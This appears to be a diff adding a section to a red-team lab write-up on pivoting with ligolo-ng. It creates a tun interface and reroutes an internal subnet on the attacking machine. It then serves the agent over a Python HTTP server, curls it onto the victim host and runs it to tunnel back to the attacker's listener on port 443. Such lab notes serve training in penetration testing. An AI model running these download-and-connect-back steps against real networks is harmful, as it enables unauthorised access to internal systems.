@@ -50,3 +50,86 @@ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_p
 #Agent  
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
 ```
+## Setting up proxy in attacking machine
+After installing this so:
+```bash
+┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
+└──╼ $sudo ip tuntap add user notconcerned mode tun ligolo
+┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
+└──╼ $ip route
+default via 192.168.137.2 dev ens33 proto dhcp src 192.168.137.145 metric 100 
+10.10.200.0/24 dev tun0 proto kernel scope link src 10.10.200.206 
+10.89.0.0/24 dev podman1 proto kernel scope link src 10.89.0.1 
+192.168.80.0/24 via 10.10.200.1 dev tun0 
+192.168.98.0/24 via 10.10.200.1 dev tun0 
+192.168.137.0/24 dev ens33 proto kernel scope link src 192.168.137.145 metric 100 
+```
+
+We can then delete our current tun0 interface torwards the internal ip range:
+```bash
+┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
+└──╼ $sudo ip route del 192.168.98.0/24 dev tun0
+```
+Set up a link with our new ligolo interface
+```bash
+┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
+└──╼ $sudo ip link set ligolo up
+```
+
+And re-add the 192.168.98.0/24 internal IP range to our new ligolo interface:
+```bash
+┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
+└──╼ $sudo ip route add 192.168.98.0/24 dev ligolo
+┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
+└──╼ $ip route
+default via 192.168.137.2 dev ens33 proto dhcp src 192.168.137.145 metric 100 
+10.10.200.0/24 dev tun0 proto kernel scope link src 10.10.200.206 
+10.89.0.0/24 dev podman1 proto kernel scope link src 10.89.0.1 
+192.168.80.0/24 via 10.10.200.1 dev tun0 
+192.168.98.0/24 dev ligolo scope link linkdown 
+192.168.137.0/24 dev ens33 proto kernel scope link src 192.168.137.145 metric 100 
+```
+
+We can then start the ligolo proxy server on the Attacking machine
+```bash
+┌─[✗]─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
+└──╼ $sudo ./proxy -selfcert -laddr 0.0.0.0:443  
+WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
+INFO[0000] Listening on 0.0.0.0:443                     
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+Made in France ♥ by @Nicocha30!
+
+ligolo-ng »  
+
+```
+
+## Setting up agent in victim machine (privilege@192.168.80.10)
+Transfer the agent to the victim machine & start the connection
+
+Set up a python server on attacking machine
+```bash
+python -m http.server 8000
+```
+
+Curl the agent from the victim machine
+```bash
+privilege@ubuntu-virtual-machine:~$ curl http://10.10.200.206:8000/agent -o agent
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 4396k  100 4396k    0     0   255k      0  0:00:17  0:00:17 --:--:--  291k
+
+```
+
+
+Run the agent. Replace this with your attacker IP address.  
+```bash
+privilege@ubuntu-virtual-machine:~$ sudo ./agent -connect 10.10.200.206:443 -ignore-cert 
+WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        addr="10.10.200.206:443" 
+```
